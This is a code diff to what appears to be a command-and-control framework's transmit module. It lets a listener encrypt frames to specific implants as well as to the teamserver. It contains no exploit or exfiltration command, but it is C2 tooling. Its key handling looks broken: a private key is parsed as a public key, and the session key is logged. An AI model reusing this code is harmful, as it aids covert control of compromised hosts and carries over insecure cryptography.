@@ -9,6 +9,12 @@ import lib.crypto.rc6
 import lib.crypto.hex_encoding
 import lib.crypto.xor
 import lib.crypto.asymmetric
+import lib.implants
+
+
+def find_implant_pubkey(listener, implant_id):
+    implant_index = lib.implants._get_implant_index(listener, implant_id)
+    return listener.implants[implant_index]['ipk'], listener.implants[implant_index]['priv_key']
 
 
 def uncook_transmit_frame(listener, frame):
@@ -48,14 +54,23 @@ def uncook_transmit_frame(listener, frame):
     return decrypted_data
 
 
-def cook_transmit_frame(listener, data):
+def cook_transmit_frame(listener, data, target_component_id="teamserver"):
     """
 
     :param listener:
     :param data: encoded/encrypted data ready to transmit
+    :param target_component_id: OPTIONAL The id of the component who's encryption key to use
     :return:
     """
     # Symmetric Encryption Routine
+    if target_component_id == "teamserver":
+        target_pubkey = listener.current_ts_pubkey
+        my_privkey = listener.current_private_key
+    else:
+        target_pubkey, my_privkey = find_implant_pubkey(listener, target_component_id)
+        target_pubkey = lib.crypto.asymmetric.public_key_from_bytes(target_pubkey)
+        my_privkey = lib.crypto.asymmetric.public_key_from_bytes(my_privkey)
+        # TODO: Extract the private key for the listener here
     rc6_key = secrets.token_urlsafe(16)
     listener.logging.log(f"rc6 key: {rc6_key}", level="debug", source="lib.transmit")
     transmit_data = lib.crypto.rc6.encrypt(rc6_key, str(data).encode('utf-8'))
@@ -76,8 +91,7 @@ def cook_transmit_frame(listener, data):
     listener.logging.log(f"Unenveloped data: {enveloped_frames}", level="debug", source="lib.transmit")
 
     # Asymmetric Encryption
-    ts_pubkey = listener.current_ts_pubkey
-    frame_box = lib.crypto.asymmetric.prepare_box(listener.current_private_key, ts_pubkey)
+    frame_box = lib.crypto.asymmetric.prepare_box(my_privkey, target_pubkey)
     transmit_frames = lib.crypto.asymmetric.encrypt(frame_box, enveloped_frames)
 
     listener.logging.log(f"Enveloped data: {transmit_frames}", level="debug", source="lib.transmit")
